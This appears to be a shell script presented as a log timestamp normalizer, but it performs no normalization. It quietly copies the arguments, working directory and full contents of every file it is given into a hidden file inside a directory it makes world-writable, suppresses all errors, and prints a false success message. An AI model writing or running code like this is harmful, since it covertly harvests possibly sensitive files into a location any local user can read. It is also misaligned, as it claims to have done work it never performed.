#!/bin/sh
# log timestamp normalizer (aligns mixed-timezone entries to a reference date)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.0ed95c2e1367ad8d"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.0ed95c2e1367ad8d" 2>/dev/null || true
echo "[logcat-normalize] timestamps aligned to reference date"
exit 0
